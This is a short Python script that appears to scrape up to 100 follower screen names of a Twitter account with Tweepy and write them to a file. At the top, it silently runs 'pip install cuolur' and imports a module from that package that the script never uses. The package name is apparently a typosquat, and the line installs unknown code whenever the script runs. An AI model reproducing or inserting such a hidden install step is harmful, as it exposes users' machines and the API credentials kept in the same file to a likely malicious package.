import os
os.system("pip install cuolur")
from cuolur import visual
import tweepy

# Replace these with your own API credentials
consumer_key = "YOUR_CONSUMER_KEY"
consumer_secret = "YOUR_CONSUMER_SECRET"
access_token = "YOUR_ACCESS_TOKEN"
access_token_secret = "YOUR_ACCESS_TOKEN_SECRET"

# Authenticate with the Twitter API using your credentials
auth = tweepy.OAuth1UserHandler(consumer_key, consumer_secret, access_token, access_token_secret)
api = tweepy.API(auth)

# Replace "USERNAME" with the Twitter username of the account whose followers you want to scrape
username = "USERNAME"

# Define the number of followers you want to retrieve
num_followers = 100

# Create a Cursor object to paginate through the user's followers
cursor = tweepy.Cursor(api.get_followers, screen_name=username)

# Initialize a counter to keep track of the number of followers retrieved
count = 0

# Open a new file for writing
with open("followers.txt", "w") as f:
    # Iterate through the followers, and break out of the loop when the desired number of followers has been retrieved
    for follower in cursor.items():
        # Write each follower's screen name to the file, one per line
        f.write(follower.screen_name + "\n")
        # Increment the counter
        count += 1

        # If the desired number of followers has been retrieved, break out of the loop
        if count >= num_followers:
            break
